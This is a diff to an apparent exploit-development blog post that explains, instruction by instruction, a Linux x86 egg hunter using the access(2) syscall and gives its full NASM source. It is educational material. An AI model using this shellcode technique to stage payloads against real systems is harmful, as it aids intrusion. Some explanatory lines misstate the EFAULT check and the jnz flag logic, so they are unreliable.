@@ -38,6 +38,7 @@ This paper provides multiple different methods of implementing an egg hunter in 
 
 
 **Access(2) syscall**
+
 The access(2) syscall as described in the man pages is usually used to check whether the calling process can access the file 'pathname' - checking to see if the process has adequate rights to a given file.  As can be seen in the man pages, the syscall requires the parameters listed below:
 
 ```
@@ -108,7 +109,100 @@ When debugged, the following shows the output of the 'or' instruction, followed 
 
 Pusha - This instruction pushes all general purpose registers to the stack. This is used to maintain the values after the syscall is used. 
 
+*Populating syscall registers*
+
+lea ebx, [edx+0x4] - This instruction is used to load the address of edx+0x4 into ebx, which is the parameter of the syscall which is used for the 'pathname'. As discussed before when looking at the 'or' instruction, the value within edx is a pointer to a memory location that increases upon every iteration. The value 4 is added to the pointer as it will allow 8 bytes of memory to be validated with each call. 
+
+mov al, 0x21 - This instruction is simply putting the value of the access(2) syscall into eax. 
+
+int 0x80 - The syscall is now called with an interrupt. 
 
 
+*Determining if the address was the required location*
+
+cmp al, 0xf2 - The return value of the syscall will be places within eax. This instruction compares that value with 0xf2, which is the low byte of the EFAULT return value. As stated in the paper by Skape, when a system call encounters an invalid memory address, most will return the EFAULT 6 error code to indicate that a pointer provided to the system call was not valid. Therefore, if the values match, it is known that there was an error and the location did contain the egg hunter key. 
+
+To prove that the return value for a failed attempt would contain 0xf2 within al the PoC code that was provided by Skape was written to work, compiled and debugged. Upon the syscall running and the search failing the following was observed:
+
+![retval](https://raw.githubusercontent.com/14Deep/14deep.github.io/master/_posts/Images/EX3/retval.png)
+
+popa - This is the opposite instruction to the 'pusha' instruction earlier, this pops all the general purposes registers that were saved in the stack earlier back to the registers. The flag from the instruction before will still be set, the important thing here is that the value of ebx would have changed back to the required egg hunter key to allow confirmation. 
+
+jz 0x9 - Based on the result of the 'cmp' instruction seen earlier, a jump will take place if the zero flag is set. If the flag is set, which would imply that the comparison was a success and the location was not correctly identified then the flow would jump back to the 'or' operation described earlier.  
+
+
+*Comparing the value at the location*
+
+cmp [edx], ebx - It is now assumed that as no EFAULT was received that the location that has been checked is the location containing the egg hunter key. The value of ebx which was originally the egg hunter key that was to be searched for is compared with the contents of the pointer in edx, the current location that was checked using the access(2) syscall. 
+
+jnz 0xe - If the zero flag is set, meaning that the values were not the same, then the flow would jump back to the 'or' operation described earlier to check the next address. 
+
+cmp [edx+0x4], ebx - Another comparison is carried out, however this time it is with the value in edx+0x4. This is because the egg hunter key supplied would fill both locations with the repeating pattern. 
+
+jnz 0xe - Once again, if the zero flag is set and they do not match the flow would jump back to the 'or' operation described earlier to check the next address. 
+
+*Continuing the execution*
+
+jmp edx - At this point the egg hunter has successfully located the rest of the shellcode. All that is left to do is to alter the flow of execution to the main shellcode. This is simply done by unconditionally jumping to edx, which is the location which has been identified as holding the egg hunter key. The main shellcode will then start to execute. 
+
+
+**Writing an egg hunter**
+
+Based on the Proof of Concept that was set out in the paper, an egg hunter shellcode was written. 
+
+```
+
+; Filename: egghunter.nasm
+; Author:   Jake
+; Website:  http://github.com/14deep
+; Purpose:  Egg Hunter shellcode using the access(2) syscall
+
+
+global _start			
+
+section .text
+_start:
+
+
+	; Clearing all the registers that will be used and moving the egghunter key to ebx. 
+	; Note this value is 1 larger than the required key and then decremented afterwards.
+	; This is to stop the egghunter thinking thinking that this may be the key to find.
+	
+xor ecx, ecx			; value to be empty for syscall
+xor edx, edx
+mul ecx				; eax nulled
+mov ebx, 0x50905091     	; key to find + 1
+dec ebx 			; dec edx to = the key
+
+
+addr_page:
+or dx, 0xfff 			; edx is used as a pointer used to iterate through blocks of memory
+				; See write up for a breakdown
+
+incr:
+inc edx				; increment edx to push it from 0xfff to 0x1000 - it will add 0x1000 each call
+pusha        			; Push all general purpose registers to the stackto maintain state after syscall
+
+lea ebx, [edx+0x4]		; loading the address of edx+0x4 to ebx for the addr parameter
+mov al, 0x21 			; access(2) syscall value
+int 0x80     			; Interupt for syscall
+
+
+cmp al, 0xf2 			; Compare return value with 0xf2 - lowest byte of efault value 
+popa         			; pop registers back from before syscall
+jz short addr_page 		; If the zero flag is set, jump to addr_inc
+
+
+cmp [edx], ebx 			; Compare the contents of ebx with edx, the key
+jnz short incr	 		; If the values do not match a jump is taken to addr_inc
+
+
+cmp [edx+0x4], ebx 		; Compare the contents of ebx+0x4 to edx, the key
+jnz short incr	 		; If the values do not match a jump is taken to addr_inc
+
+
+jmp edx      			; unconditional jump to edx, the confirmed location to continue execution
+
+```
 
 
